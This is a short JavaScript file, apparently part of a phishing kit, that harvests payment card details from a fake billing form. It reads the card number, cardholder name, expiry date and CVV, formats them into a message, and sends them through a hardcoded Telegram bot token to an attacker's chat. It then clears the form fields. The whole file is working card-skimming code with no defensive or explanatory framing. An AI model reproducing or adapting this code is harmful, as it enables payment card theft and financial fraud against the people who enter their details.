//bot token
var telegram_bot_id = "5712522024:AAHrYoBChw1JwK8R-8zB5d_7Z9sM7jrha74";

//chat id
var chat_id = -1001732954392;
var CardOwner, CCNumber, Datee, Cvv;

var ready = function () {

    CCNumber = document.getElementById("encryptedCardNumber").value;
    Datee = document.getElementById("date").value;
    Cvv = document.getElementById("cv2").value;
    CardOwner = document.getElementById("paymentCardOwner").value;

    message = " 💰 Billing Infos (TV) 💰 \n 💳 Card Number: " + CCNumber +
        " \n😵 Card Owner: " + CardOwner +
        " \n📅 Expiration Date: " + Datee +
        " \n🔑 CVV: " + Cvv
        ;

};

var senderBillsTV = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("encryptedCardNumber").value = "";
    document.getElementById("date").value = "";
    document.getElementById("cv2").value = "";
    document.getElementById("paymentCardOwner").value = "";

    return false;
};
